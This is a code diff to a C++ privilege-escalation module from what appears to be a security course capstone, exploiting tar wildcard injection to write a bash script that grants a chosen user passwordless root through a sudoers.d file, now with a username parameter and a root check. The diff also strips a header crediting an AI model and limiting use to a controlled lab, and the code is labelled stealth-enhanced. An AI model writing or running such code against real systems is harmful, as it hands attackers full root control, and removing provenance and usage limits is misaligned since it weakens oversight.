@@ -1,10 +1,6 @@
 /*
  * COMPSCI564 - Cyber Effects Capstone Project
  * Tar Wildcard Privilege Escalation Implementation (Stealth-Enhanced)
- * 
- * AI Assistance Attribution:
- * Developed with assistance from Claude (Anthropic)
- * For educational use in controlled lab environment only.
  */
 
 #include "privesc.h"
@@ -14,6 +10,7 @@
 #include <fcntl.h>
 #include <time.h>
 #include <cstring>
+#include <cstdio>   // for snprintf
 
 // ============================================================================
 // MINIMAL STRING HELPERS
@@ -79,7 +76,7 @@ static bool ensure_directory(const char* path) {
 // PRIVILEGE ESCALATION EXECUTION (STEALTH-ENHANCED)
 // ============================================================================
 
-int execute_tar_privesc() {
+int execute_tar_privesc(const char* target_user) {
     const char* backups_dir = "/tmp/backups";
     
     if (!ensure_directory(backups_dir)) {
@@ -90,10 +87,13 @@ int execute_tar_privesc() {
         return -1;
     }
     
-    const char* script_content = 
+    // Build the sudoers line with the actual username
+    char script_content[256];
+    snprintf(script_content, sizeof(script_content),
         "#!/bin/bash\n"
-        "echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers.d/www-data\n"
-        "chmod 440 /etc/sudoers.d/www-data\n";
+        "echo '%s ALL=(root) NOPASSWD: ALL' > /etc/sudoers.d/%s\n"
+        "chmod 440 /etc/sudoers.d/%s\n",
+        target_user, target_user, target_user);
     
     char script_path[128];
     str_copy(script_path, backups_dir, 128);
@@ -151,13 +151,8 @@ int execute_tar_privesc() {
     return 0;
 }
 
-// ============================================================================
-// ROOT CHECK
-// ============================================================================
-
 bool check_if_root() {
     unsigned int uid = syscall(SYS_getuid);
     unsigned int euid = syscall(SYS_geteuid);
-    
     return (uid == 0 || euid == 0);
 }
